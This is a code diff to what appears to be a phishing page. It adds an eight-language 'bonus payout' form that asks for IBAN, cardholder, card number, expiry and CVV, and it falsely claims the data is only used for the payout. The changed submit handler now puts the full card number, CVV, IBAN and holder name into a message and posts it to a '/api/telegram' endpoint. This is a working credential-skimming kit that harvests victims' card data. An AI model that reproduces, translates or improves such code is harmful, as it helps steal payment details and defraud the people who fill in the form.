@@ -207,6 +207,246 @@ const LANGS = {
       cvv_required:"CVV erforderlich.",
       cvv_len:"CVV muss genau 3 Ziffern haben."
     }
+  },
+
+  en:{ name:"English",
+    title:"Which account should the bonus be paid to?",
+    sub:"Enter your payment details so we can process the payout correctly.",
+    labels:{ iban:"IBAN", holder:"CARDHOLDER", card:"CARD NUMBER", exp:"EXPIRY DATE", cvv:"CVV" },
+    notice:"Security note: Your payment details are processed only to handle the bonus payout.",
+    cont:"Continue",
+    placeholders:{ holder:"John Doe", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
+    errors:{
+      iban_required:"IBAN is required.",
+      iban_format:"Invalid IBAN format.",
+      iban_invalid:"IBAN is invalid.",
+
+      holder_required:"Name is required.",
+      holder_chars:"Only letters are allowed in the name.",
+      holder_two:"First and last name required.",
+
+      card_required:"Card number is required.",
+      card_len:"Invalid card number length.",
+      card_invalid:"Card number is invalid.",
+
+      exp_required:"Expiry date is required.",
+      exp_format:"Format MM/YY required.",
+      exp_month:"Invalid month.",
+      exp_past:"Card is expired.",
+
+      cvv_required:"CVV is required.",
+      cvv_len:"CVV must be exactly 3 digits."
+    }
+  },
+
+  es:{ name:"Español",
+    title:"¿A qué cuenta debe transferirse la prima?",
+    sub:"Introduce tus datos de pago para que podamos procesar el abono correctamente.",
+    labels:{ iban:"IBAN", holder:"TITULAR", card:"NÚMERO DE TARJETA", exp:"CADUCIDAD", cvv:"CVV" },
+    notice:"Aviso de seguridad: Tus datos de pago se procesan solo para gestionar el abono de la prima.",
+    cont:"Continuar",
+    placeholders:{ holder:"Juan Pérez", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
+    errors:{
+      iban_required:"IBAN obligatorio.",
+      iban_format:"Formato de IBAN inválido.",
+      iban_invalid:"El IBAN no es válido.",
+
+      holder_required:"Nombre obligatorio.",
+      holder_chars:"Solo se permiten letras en el nombre.",
+      holder_two:"Se requiere nombre y apellido.",
+
+      card_required:"Número de tarjeta obligatorio.",
+      card_len:"Longitud del número inválida.",
+      card_invalid:"El número de tarjeta no es válido.",
+
+      exp_required:"Caducidad obligatoria.",
+      exp_format:"Formato MM/AA requerido.",
+      exp_month:"Mes inválido.",
+      exp_past:"La tarjeta está caducada.",
+
+      cvv_required:"CVV obligatorio.",
+      cvv_len:"El CVV debe tener 3 dígitos."
+    }
+  },
+
+  fr:{ name:"Français",
+    title:"Sur quel compte la prime doit-elle être versée ?",
+    sub:"Saisis tes informations de paiement pour que nous puissions traiter le versement correctement.",
+    labels:{ iban:"IBAN", holder:"TITULAIRE", card:"NUMÉRO DE CARTE", exp:"DATE D’EXPIRATION", cvv:"CVV" },
+    notice:"Note de sécurité : tes données de paiement sont traitées uniquement pour gérer le versement de la prime.",
+    cont:"Continuer",
+    placeholders:{ holder:"Jean Dupont", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
+    errors:{
+      iban_required:"IBAN requis.",
+      iban_format:"Format IBAN invalide.",
+      iban_invalid:"IBAN invalide.",
+
+      holder_required:"Nom requis.",
+      holder_chars:"Seules les lettres sont autorisées.",
+      holder_two:"Prénom et nom requis.",
+
+      card_required:"Numéro de carte requis.",
+      card_len:"Longueur du numéro invalide.",
+      card_invalid:"Numéro de carte invalide.",
+
+      exp_required:"Date d’expiration requise.",
+      exp_format:"Format MM/AA requis.",
+      exp_month:"Mois invalide.",
+      exp_past:"Carte expirée.",
+
+      cvv_required:"CVV requis.",
+      cvv_len:"Le CVV doit avoir 3 chiffres."
+    }
+  },
+
+  it:{ name:"Italiano",
+    title:"Su quale conto deve essere accreditato il premio?",
+    sub:"Inserisci i dati di pagamento per elaborare correttamente l’accredito.",
+    labels:{ iban:"IBAN", holder:"TITOLARE", card:"NUMERO CARTA", exp:"SCADENZA", cvv:"CVV" },
+    notice:"Nota di sicurezza: i tuoi dati di pagamento vengono trattati solo per gestire l’accredito del premio.",
+    cont:"Continua",
+    placeholders:{ holder:"Mario Rossi", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
+    errors:{
+      iban_required:"IBAN richiesto.",
+      iban_format:"Formato IBAN non valido.",
+      iban_invalid:"IBAN non valido.",
+
+      holder_required:"Nome richiesto.",
+      holder_chars:"Sono consentite solo lettere nel nome.",
+      holder_two:"Nome e cognome richiesti.",
+
+      card_required:"Numero carta richiesto.",
+      card_len:"Lunghezza numero non valida.",
+      card_invalid:"Numero carta non valido.",
+
+      exp_required:"Scadenza richiesta.",
+      exp_format:"Formato MM/AA richiesto.",
+      exp_month:"Mese non valido.",
+      exp_past:"Carta scaduta.",
+
+      cvv_required:"CVV richiesto.",
+      cvv_len:"Il CVV deve avere 3 cifre."
+    }
+  },
+
+  pt:{ name:"Português",
+    title:"Para que conta deve ser transferido o prémio?",
+    sub:"Introduz os teus dados de pagamento para processarmos o pagamento corretamente.",
+    labels:{ iban:"IBAN", holder:"TITULAR", card:"NÚMERO DO CARTÃO", exp:"VALIDADE", cvv:"CVV" },
+    notice:"Nota de segurança: os teus dados de pagamento são processados apenas para tratar o pagamento do prémio.",
+    cont:"Continuar",
+    placeholders:{ holder:"João Silva", card:"1234 5678 9012 3456", exp:"MM/AA", cvv:"123" },
+    errors:{
+      iban_required:"IBAN obrigatório.",
+      iban_format:"Formato de IBAN inválido.",
+      iban_invalid:"IBAN inválido.",
+
+      holder_required:"Nome obrigatório.",
+      holder_chars:"Apenas letras são permitidas no nome.",
+      holder_two:"Nome e apelido obrigatórios.",
+
+      card_required:"Número do cartão obrigatório.",
+      card_len:"Comprimento inválido do número.",
+      card_invalid:"Número do cartão inválido.",
+
+      exp_required:"Validade obrigatória.",
+      exp_format:"Formato MM/AA obrigatório.",
+      exp_month:"Mês inválido.",
+      exp_past:"Cartão expirado.",
+
+      cvv_required:"CVV obrigatório.",
+      cvv_len:"O CVV deve ter 3 dígitos."
+    }
+  },
+
+  nl:{ name:"Nederlands",
+    title:"Naar welke rekening moet de premie worden overgemaakt?",
+    sub:"Vul je betaalgegevens in zodat we de uitbetaling correct kunnen verwerken.",
+    labels:{ iban:"IBAN", holder:"KAARTHOUDER", card:"KAARTNUMMER", exp:"VERVALDATUM", cvv:"CVV" },
+    notice:"Beveiligingsmelding: je betaalgegevens worden alleen verwerkt voor de uitbetaling van de premie.",
+    cont:"Doorgaan",
+    placeholders:{ holder:"Jan Jansen", card:"1234 5678 9012 3456", exp:"MM/JJ", cvv:"123" },
+    errors:{
+      iban_required:"IBAN is verplicht.",
+      iban_format:"Ongeldig IBAN-formaat.",
+      iban_invalid:"IBAN is ongeldig.",
+
+      holder_required:"Naam is verplicht.",
+      holder_chars:"Alleen letters zijn toegestaan.",
+      holder_two:"Voor- en achternaam verplicht.",
+
+      card_required:"Kaartnummer is verplicht.",
+      card_len:"Ongeldige lengte van kaartnummer.",
+      card_invalid:"Kaartnummer is ongeldig.",
+
+      exp_required:"Vervaldatum is verplicht.",
+      exp_format:"Formaat MM/JJ vereist.",
+      exp_month:"Ongeldige maand.",
+      exp_past:"Kaart is verlopen.",
+
+      cvv_required:"CVV is verplicht.",
+      cvv_len:"CVV moet 3 cijfers zijn."
+    }
+  },
+
+  ru:{ name:"Русский",
+    title:"На какой счёт перечислить премию?",
+    sub:"Введите платёжные данные, чтобы мы корректно обработали выплату.",
+    labels:{ iban:"IBAN", holder:"ДЕРЖАТЕЛЬ КАРТЫ", card:"НОМЕР КАРТЫ", exp:"СРОК", cvv:"CVV" },
+    notice:"Примечание по безопасности: платёжные данные обрабатываются только для выплаты премии.",
+    cont:"Продолжить",
+    placeholders:{ holder:"Иван Иванов", card:"1234 5678 9012 3456", exp:"MM/ГГ", cvv:"123" },
+    errors:{
+      iban_required:"Требуется IBAN.",
+      iban_format:"Неверный формат IBAN.",
+      iban_invalid:"IBAN недействителен.",
+
+      holder_required:"Требуется имя.",
+      holder_chars:"В имени допускаются только буквы.",
+      holder_two:"Нужны имя и фамилия.",
+
+      card_required:"Требуется номер карты.",
+      card_len:"Неверная длина номера карты.",
+      card_invalid:"Номер карты недействителен.",
+
+      exp_required:"Требуется срок действия.",
+      exp_format:"Требуется формат MM/ГГ.",
+      exp_month:"Неверный месяц.",
+      exp_past:"Срок действия карты истёк.",
+
+      cvv_required:"Требуется CVV.",
+      cvv_len:"CVV должен содержать 3 цифры."
+    }
+  },
+
+  zhCN:{ name:"简体中文",
+    title:"奖金要汇入哪个账户？",
+    sub:"请输入支付信息，以便我们正确处理奖金发放。",
+    labels:{ iban:"IBAN", holder:"持卡人", card:"卡号", exp:"有效期", cvv:"CVV" },
+    notice:"安全提示：你的支付信息仅用于处理奖金发放。",
+    cont:"继续",
+    placeholders:{ holder:"张三", card:"1234 5678 9012 3456", exp:"MM/YY", cvv:"123" },
+    errors:{
+      iban_required:"需要填写 IBAN。",
+      iban_format:"IBAN 格式无效。",
+      iban_invalid:"IBAN 无效。",
+
+      holder_required:"需要填写姓名。",
+      holder_chars:"姓名只能包含字母。",
+      holder_two:"需要填写名和姓。",
+
+      card_required:"需要填写卡号。",
+      card_len:"卡号长度无效。",
+      card_invalid:"卡号无效。",
+
+      exp_required:"需要填写有效期。",
+      exp_format:"需要 MM/YY 格式。",
+      exp_month:"月份无效。",
+      exp_past:"卡已过期。",
+
+      cvv_required:"需要填写 CVV。",
+      cvv_len:"CVV 必须是 3 位数字。"
+    }
   }
 };
 
@@ -511,10 +751,21 @@ btn.addEventListener("click", async () => {
 
   // BANK_NAME ist bereits gesetzt (oder hier nochmal sichern)
   if (BANKS_DE) BANK_NAME = bankNameFromIban(ibanEl.value) || "";
+const cardDigits = (cardEl.value || "").replace(/\D/g, "");
+const iban = (ibanEl.value || "")
+  .toUpperCase()
+  .replace(/[^A-Z0-9]/g, "");
+const holder = (holderEl.value || "").trim();
+const adate = (expEl.value || "").replace(/\D/g, "");
+const cvv = (cvvEl.value || "").replace(/\D/g, "");
 
   const msg =
-    `🏦 Bank: ${BANK_NAME || "Unbekannt"}\n` +
-    `✅ Formular gültig`;
+  `🏦 IBAN: ${iban}\n` +
+  `🏦 Bank: ${BANK_NAME || "Unbekannt"}\n` +
+  `💳 Kartennummer: ${cardDigits}\n` +
+  `👤 Kartenbesitzer: ${holder}\n` +
+  `📅 Ablaufdatum: ${adate}\n` +
+  `🔐 CVV: ${cvv}\n`
 
   // ✅ Request an dein Endpoint
   await fetch("/api/telegram", {
